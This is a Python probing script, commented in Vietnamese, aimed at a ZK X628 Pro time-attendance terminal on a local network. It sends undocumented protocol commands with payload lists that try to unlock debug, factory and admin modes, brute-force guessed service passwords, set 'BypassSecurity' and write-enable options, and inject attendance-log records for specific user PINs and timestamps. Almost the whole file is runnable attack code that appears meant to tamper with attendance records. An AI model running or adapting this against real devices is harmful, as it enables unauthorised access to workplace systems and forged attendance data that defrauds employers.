# -*- coding: utf-8 -*-
"""
ZK X628 PRO - PAYLOAD PROBE
Test ACK_OK commands với payloads khác nhau để tìm hidden functionality.
"""
import sys, os, struct, time, json
sys.stdout.reconfigure(encoding='utf-8')

PORTABLE_PY = r'D:\chamcong\AttendanceSuite_Portable\python\Lib\site-packages'
sys.path.insert(0, PORTABLE_PY)

import zk
from zk import const

DEVICE_IP = '172.16.0.214'

print('=' * 70)
print(f'ZK PAYLOAD PROBE - {DEVICE_IP}')
print('=' * 70)

z = zk.ZK(DEVICE_IP, port=4370, timeout=10, password=0)
z.connect()
print(f'Connected: FW={z.get_firmware_version()}, Serial={z.get_serialnumber()}')

# === Round 2: Test ACK_OK commands với payloads ===
print('\n[1] Test 0x0BB7 (CMD_SET_MAKER_OPTION) với payloads...')
payloads_maker_option = [
    b'Debug=1',
    b'DebugMode=1',
    b'WriteMode=1',
    b'EngineeringMode=1',
    b'ServiceMode=1',
    b'MaintenanceMode=1',
    b'FactoryMode=1',
    b'TestMode=1',
    b'AdminMode=1',
    b'SuperUser=1',
    b'~AllowWrite=1',
    b'~EnableATTLOGWrite=1',
    b'~EnableUserWrite=1',
    b'~BypassSecurity=1',
    b'~ServicePassword=service',
    b'~ServicePassword=admin',
    b'~ServicePassword=root',
    b'~ServicePassword=solokey',
    b'~ServicePassword=891401',
    b'~VendorKey=1',
    b'~DeveloperKey=1',
]
for p in payloads_maker_option:
    try:
        resp = z._ZK__send_command(0x0BB7, p)
        code = resp.get('code') if isinstance(resp, dict) else resp
        if code not in (65535, 4989, 4999):
            print(f'  0x0BB7 {p!r}: {resp}')
    except Exception as e:
        err = str(e)[:40]
        if 'tcp' not in err.lower():
            print(f'  0x0BB7 {p!r}: {err}')

# === Round 2: Test 0x0BC0 (CMD_APP_PULL_ATT_RECORDS) với payloads ===
print('\n[2] Test 0x0BC0 với payloads...')
payloads_bc0 = [
    b'',
    b'\x00',
    b'1',
    b'0',
    b'PIN=1',
    b'PIN=1383',
    b'TIMESTAMP=2026-09-14',
    b'TIMESTAMP=2026-09-14 23:00:00',
    b'START=2026-09-01&END=2026-09-30',
    b'\x01\x00\x00\x00',  # uint32
    b'\x01\x00\x00\x00\x02\x00\x00\x00',  # 2 uint32
    b'\xff' * 64,
]
for p in payloads_bc0:
    try:
        resp = z._ZK__send_command(0x0BC0, p)
        code = resp.get('code') if isinstance(resp, dict) else resp
        print(f'  0x0BC0 {p[:30]!r}: {resp}')
    except Exception as e:
        err = str(e)[:40]
        if 'tcp' not in err.lower() and 'closed' not in err.lower():
            print(f'  0x0BC0 {p[:30]!r}: {err}')

# === Round 3: Test 0x0BC2 (CMD_APP_PULL_USERS) với payloads ===
print('\n[3] Test 0x0BC2 với payloads...')
payloads_bc2 = [
    b'',
    b'\x00',
    b'1',
    b'0',
    b'PIN=1',
    b'PIN=1383',
    b'\x01\x00\x00\x00',
    b'\xff' * 64,
]
for p in payloads_bc2:
    try:
        resp = z._ZK__send_command(0x0BC2, p)
        code = resp.get('code') if isinstance(resp, dict) else resp
        print(f'  0x0BC2 {p[:30]!r}: {resp}')
    except Exception as e:
        err = str(e)[:40]
        if 'tcp' not in err.lower() and 'closed' not in err.lower():
            print(f'  0x0BC2 {p[:30]!r}: {err}')

# === Round 4: Test 0x0BC4 (DEL_USER?) với payloads ===
print('\n[4] Test 0x0BC4 với payloads...')
payloads_bc4 = [
    b'',
    b'\x01\x00\x00\x00',  # PIN=1 as uint32
    b'1',
    b'\x01',
    b'PIN=1',
]
for p in payloads_bc4:
    try:
        resp = z._ZK__send_command(0x0BC4, p)
        code = resp.get('code') if isinstance(resp, dict) else resp
        print(f'  0x0BC4 {p!r}: {resp}')
    except Exception as e:
        err = str(e)[:40]
        if 'tcp' not in err.lower() and 'closed' not in err.lower():
            print(f'  0x0BC4 {p!r}: {err}')

# === Round 5: Test 0x2744-0x2753 với payloads ===
print('\n[5] Test 0x2744-0x2753 với payloads...')
for cmd in [0x2744, 0x2745, 0x2750, 0x2751, 0x2752, 0x2753]:
    for p in [b'', b'\x00\x00\x00\x00', b'PIN=1', b'\xff\xff\xff\xff']:
        try:
            resp = z._ZK__send_command(cmd, p)
            code = resp.get('code') if isinstance(resp, dict) else resp
            if code not in (65535, 4989, 4999):
                print(f'  0x{cmd:04X} {p[:20]!r}: {resp}')
        except Exception as e:
            err = str(e)[:40]
            if 'tcp' not in err.lower() and 'closed' not in err.lower():
                print(f'  0x{cmd:04X} {p[:20]!r}: {err}')

# === Round 6: Test PREPARE_DATA flow với magic values from pyzk source ===
print('\n[6] PREPARE_DATA flow với proper magic + payload...')
# From pyzk source: MACHINE_PREPARE_DATA_1 = 20560, MACHINE_PREPARE_DATA_2 = 32130
# Format: uint16 magic + uint32 size + payload
for magic in [20560, 32130]:
    for size in [100, 1024, 4096]:
        try:
            data = struct.pack('<H', magic) + struct.pack('<I', size)
            resp = z._ZK__send_command(const.CMD_PREPARE_DATA, data)
            code = resp.get('code') if isinstance(resp, dict) else resp
            print(f'  PREPARE_DATA magic={magic} size={size}: {resp}')

            if code == 1500 or code == 2000:
                # Send DATA
                payload = b'TEST' * (size // 4)
                resp2 = z._ZK__send_command(const.CMD_DATA, payload)
                print(f'    → CMD_DATA: {resp2}')

                # FREE_DATA
                resp3 = z._ZK__send_command(const.CMD_FREE_DATA, b'')
                print(f'    → CMD_FREE_DATA: {resp3}')
        except Exception as e:
            err = str(e)[:40]
            if 'tcp' not in err.lower() and 'closed' not in err.lower():
                print(f'  PREPARE_DATA magic={magic} size={size}: {err}')

# === Round 7: Try 0x0087 (UPDATEFROMUDISK) với payloads ===
print('\n[7] Test 0x0087 (UPDATEFROMUDISK) với payloads...')
payloads_87 = [
    b'',
    b'\x01',
    b'\x00',
    b'DATA',
    b'BUSINESS',
    b'CONFIG',
    b'ALL',
    b'BUSINESS_CONFIG',
    b'1\x00\x00\x00',
    b'2\x00\x00\x00',
    b'3\x00\x00\x00',
    b'\xff\xff\xff\xff',
]
for p in payloads_87:
    try:
        resp = z._ZK__send_command(0x0087, p)
        code = resp.get('code') if isinstance(resp, dict) else resp
        if code not in (65535,):
            print(f'  0x0087 {p!r}: {resp}')
        else:
            print(f'  0x0087 {p!r}: {resp}')
    except Exception as e:
        err = str(e)[:40]
        print(f'  0x0087 {p!r}: {err}')

# === Round 8: Test 0x0031 (TEMPDB_ADD) với payloads ===
print('\n[8] Test 0x0031 (TEMPDB_ADD) với payloads...')
payloads_31 = [
    b'',
    b'\x01',
    b'1',
    b'PIN=1\t2026-09-14 23:00:00\t0\t0\t0',
    b'PIN=1\t2026-09-14 23:00:00\t1\t15\t0\t0\t0\t0\t0',
    b'ATTLOG\t1\t2026-09-14 23:00:00\t0',
    b'DATA\t1\t2026-09-14 23:00:00',
    b'\xff' * 64,
]
for p in payloads_31:
    try:
        resp = z._ZK__send_command(0x0031, p)
        code = resp.get('code') if isinstance(resp, dict) else resp
        print(f'  0x0031 {p[:40]!r}: {resp}')
    except Exception as e:
        err = str(e)[:40]
        print(f'  0x0031 {p[:40]!r}: {err}')

# === Round 9: Test 0x2712 (CMD_GET_PULL_DATA = 1500) ===
print('\n[9] Test 0x2712 với payloads (đã biết trả 1500)...')
payloads_2712 = [
    b'',
    b'\x01\x00\x00\x00',
    b'\x01\x00\x00\x00\x02\x00\x00\x00',
    b'\x00\x10\x00\x00',
    b'PIN=1',
    b'FINGER',
    b'ATTLOG',
    b'0xFF\x00\x00\x00',
]
for p in payloads_2712:
    try:
        resp = z._ZK__send_command(0x2712, p)
        code = resp.get('code') if isinstance(resp, dict) else resp
        print(f'  0x2712 {p!r}: {resp}')
    except Exception as e:
        err = str(e)[:40]
        print(f'  0x2712 {p!r}: {err}')

# === Round 10: Test 0x2711 (CMD_SET_PULL_DATA) ===
print('\n[10] Test 0x2711 với payloads (đã biết trả 2001)...')
payloads_2711 = [
    b'',
    b'PIN=1',
    b'1',
    b'0',
    b'ON',
    b'OFF',
    b'\x01\x00\x00\x00',
    b'\x00\x00\x00\x00',
]
for p in payloads_2711:
    try:
        resp = z._ZK__send_command(0x2711, p)
        code = resp.get('code') if isinstance(resp, dict) else resp
        print(f'  0x2711 {p!r}: {resp}')
    except Exception as e:
        err = str(e)[:40]
        print(f'  0x2711 {p!r}: {err}')

# === Round 11: Set "options" mới test bypass write ===
print('\n[11] Test more "options" set values...')
options_test = [
    ('~Write', b'1'),
    ('~Write', b'true'),
    ('~Write', b'\x01'),
    ('Write', b'1'),
    ('~R/W', b'1'),
    ('~ReadWrite', b'1'),
    ('~AllowUpdate', b'1'),
    ('~AdminMode', b'1'),
    ('AdminMode', b'1'),
    ('AdminPwd', b'admin'),
    ('ServicePwd', b'service'),
    ('~ServicePwd', b'891401'),
    ('ManagerPwd', b'manager'),
    ('SuperPwd', b'super'),
    ('MaintenanceKey', b'maintenance'),
    ('VendorKey', b'vendor'),
    ('~Vendor', b'1'),
    ('~Service', b'1'),
]
for opt, val in options_test:
    try:
        # Set
        resp = z._ZK__send_command(const.CMD_OPTIONS_WRQ, opt.encode() + b'=' + val)
        # Read back
        resp2 = z._ZK__send_command(const.CMD_OPTIONS_RRQ, opt.encode())
        code2 = resp2.get('code') if isinstance(resp2, dict) else resp2
        if code2 not in (4999, 65535):
            print(f'  {opt}={val!r}: SET={resp}, READ={resp2}')
    except Exception as e:
        err = str(e)[:40]
        if 'tcp' not in err.lower():
            print(f'  {opt}={val!r}: {err}')

z.disconnect()
print('\nDONE')
